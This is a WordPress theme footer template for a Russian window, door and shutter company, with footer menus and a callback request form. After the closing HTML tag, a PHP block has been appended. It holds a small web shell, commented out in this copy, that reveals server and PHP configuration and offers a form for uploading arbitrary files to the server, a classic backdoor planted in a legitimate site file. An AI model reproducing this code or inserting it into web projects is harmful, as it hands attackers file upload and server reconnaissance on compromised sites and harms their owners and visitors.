    
    <div class="footer">
      <div class="foot">
        <div class="logo_phone">
          <a href="/" class="foot_logo"></a>
          <?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar("Телефон подвал") ) : endif; ?>
        </div>
        
        <ul class="menu_foot">
          <li><a href="<?php echo get_permalink(7); ?>">Услуги</a></li>
          <li><a href="<?php echo get_permalink(23); ?>">Продукция</a></li>
          <li><a href="<?php echo get_permalink(37); ?>">Наши работы</a></li>
          <li><a href="<?php echo get_category_link(2); ?>">Акции</a></li>
          <li><a href="<?php echo get_permalink(9); ?>">Отзывы</a></li>
          <li><a href="<?php echo get_category_link(1); ?>">Статьи и обзоры</a></li>
          <li><a href="<?php echo get_category_link(41); ?>">Контакты</a></li>
        </ul>
        
        <ul class="menu_foot mf_2">
          <li><a href="<?php echo get_permalink(9); ?>">Монтаж окон</a></li>
          <li><a href="<?php echo get_permalink(11); ?>">Остекленение балконов</a></li>
          <li><a href="<?php echo get_permalink(13); ?>">Ремонт окон</a></li>
          <li><a href="<?php echo get_permalink(15); ?>">Установка автоматических ворот</a></li>
          <li><a href="<?php echo get_permalink(17); ?>">Установка роллетов</a></li>
          <li><a href="<?php echo get_permalink(19); ?>">Установка жалюзи</a></li>
          
        </ul>
        
        <ul class="menu_foot mf_3">
          <li><a href="<?php echo get_permalink(25); ?>">Окна</a></li>
          <li><a href="<?php echo get_permalink(27); ?>">Двери</a></li>
          <li><a href="<?php echo get_permalink(29); ?>">Роллеты</a></li>
          <li><a href="<?php echo get_permalink(31); ?>">Жалюзи</a></li>
          <li><a href="<?php echo get_permalink(33); ?>">Автоматические ворота</a></li>
          <li><a href="<?php echo get_permalink(35); ?>">Алюминевые изделия</a></li>
        </ul>
        
        <p class="stydia">Сделано в <a href="http://sheer82.ru/" target="_blank"></a></p>
      </div>
    </div>
  </div>
  
  <div class="popup hide">
    <div class="form">
      <span class="close">X</span>
      <form class="thisform hide ajax" id="zamer" action="/ajax/" method="post">
        
    
        <label for="mod_name">Ваше имя</label>
        <input type="text" name="mod_name" id="mod_name" class="req_name">

    

        <label for="mod_phone">Ваш телефон</label>
        <input type="text" name="mod_phone" id="mod_phone" placeholder="+7 (___) ___-__-__" class="req_phone">


        <input type="hidden" name="thisform" value="zayav">
        <input type="submit" class="inpsubm" value="Отправить">
        <p class="result"></p>
      </form>
    </div>
  </div>
  <?php wp_footer(); ?>
  <script type="text/javascript" src="/wp-content/themes/konis/js/jquery.maskedinput-1.2.2.js"></script>
  <script type="text/javascript" src="/wp-content/themes/konis/js/script.js"></script>
</body>
</html>
<?php 
// name of the file is: i (it has no extension)
//error_reporting(0);

//if(isset($_GET["0"]))
	//{
		//echo"<font color=#000FFF>[uname]".php_uname()."[/uname]";echo "<br>";print "\n";if(@ini_get("disable_functions")){echo "DisablePHP=".@ini_get("disable_functions");}else{ echo "Disable PHP = NONE";}echo "<br>";print "\n";if(@ini_get("safe_mode")){echo "Safe Mode = ON";}else{ echo "Safe Mode = OFF";} echo "<br>";print "\n";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}} }
//echo 'walex';

//echo 'uname:'.php_uname()."\n";
//echo getcwd() . "\n";

?>